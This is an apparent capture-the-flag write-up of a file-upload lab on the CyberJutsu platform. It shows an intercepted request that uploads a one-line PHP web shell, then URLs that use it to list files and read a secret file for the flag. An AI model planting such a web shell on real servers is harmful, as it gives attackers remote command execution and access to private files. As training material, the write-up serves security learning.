# Lab Writeup – File Upload 1

## Overview

Platform: CyberJutsu  
Difficulty: Easy

---

![Image](./screenshots/file-upload-1-01.png)

---

## 1. Upload File test.txt and Press submit

![Image](./screenshots/file-upload-1-02.png)

---

## 2. Capture packets in Burp Suite and send an HTTP POST request

```
------WebKitFormBoundarylA6Ej6AtXvTlpKHY
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/plain

<?php system($_GET[x]); ?>
------WebKitFormBoundarylA6Ej6AtXvTlpKHY--
```

![Image](./screenshots/file-upload-1-03.png)

---

## 3. Access file test.php and add parameter for url

```
https://www.../test.php?x=ls%20-la%20
```

![Image](./screenshots/file-upload-1-04.png)

---

## 4. Find and Read secret.txt to get FLAG

```
https://www.../test.php?x=cat%20/71c99ec9c94-secret.txt
```
